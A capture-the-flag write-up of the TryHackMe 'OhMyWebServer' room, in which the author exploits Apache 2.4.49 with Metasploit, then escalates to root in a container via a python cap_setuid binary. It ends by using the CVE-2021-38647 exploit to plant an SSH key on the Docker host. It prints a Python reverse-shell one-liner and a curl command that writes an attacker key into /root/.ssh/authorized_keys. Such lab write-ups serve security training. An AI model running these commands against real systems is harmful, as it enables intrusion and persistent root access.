---
title: "TryHackMe - OhMyWebServer"
author: Nasrallah
description: ""
date: 2022-11-29 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, rce, cve, capability, getcap, metasploit, docker]
img_path: /assets/img/tryhackme/ohmyweb
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [OhMyWebServer](https://tryhackme.com/room/ohmyweb) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.205.62
Host is up (0.10s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0d188762a9379d391046d25160e56d4 (RSA)
|   256 91185c2c5ef8993c9a1f0424300eaa9b (ECDSA)
|_  256 d1632a36dd94cf3c573e8ae88500caf6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 running OpenSSH 8.2p1 and 80 running Apache http web server 2.4.49.

Searching on [exploit-db](https://www.exploit-db.com/) we find that this apache version is vulnerable path traversal and remote code execution.

![](1.png)

# **Foothold**

There is a metasploit module available to exploit this vulnerability called `exploit/multi/http/apache_normalize_path_rce`, let's use it and set the options.

```terminal
msf6 exploit(multi/http/apache_normalize_path_rce) > set rhost 10.10.10.10
msf6 exploit(multi/http/apache_normalize_path_rce) > set lhost tun0
msf6 exploit(multi/http/apache_normalize_path_rce) > set rport 80
msf6 exploit(multi/http/apache_normalize_path_rce) > set ssl false 
```

Now let's run the exploit.

![](2.png)

Great! We got a shell. But i decided to get a full tty shell by setting up a listener on my machine and executing the following command on the compromised machine.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![](3.png)

# **Privilege Escalation**

We can see that we're a docker container from the name of the host and from the hidden directory in root `/`.

![](4.png)

After some enumeration, checking the capabilities in the machine we find the following:

```terminal
daemon@4a70924bafa0:~$ getcap -r / 2>/dev/null 
/usr/bin/python3.7 = cap_setuid+ep
```

We python have the setuid capability, let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities).

![](5.png)

Run the following command to become root.

```bash
python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![](6.png)

After that we run `ifconfig` and find some interesting stuff.

```terminal
root@4a70924bafa0:/root# ifconfig 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 4818  bytes 4205388 (4.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3304  bytes 689936 (673.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We see that our IP is `172.17.0.2`, this means there is another docker container at `172.17.0.1`.

Let's upload a [nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) static binary and scan that container.

```bash
root@4a70924bafa0:/root# chmod +x nmap 172.17.0.1 -p- --min-rate 6000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-10-28 07:36 UTC
Unable to find nmap-services!  Resorting to /etc/services
Failed to resolve "https:".
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000030s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:4D:1E:79:D8 (Unknown)
```

We found three open ports. The port 5986 is not common, so i searched for it on google an found it's vulnerable to remote code execution, here's the [exploit](https://github.com/AlteredSecurity/CVE-2021-38647/).

Let's upload the exploit to the compromised machine a run it.

![](7.png)

Great! we can execute command as root.

Let's upload our ssh public key and put in `authorized_keys` file using the following command:

```bash
python3 exploit.py -t 172.17.0.1 -c 'curl http://10.18.0.188/sirius.pub -o /root/.ssh/authorized_keys'
```

Now we can ssh into the machine as root without a password.

![](8.png)



---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
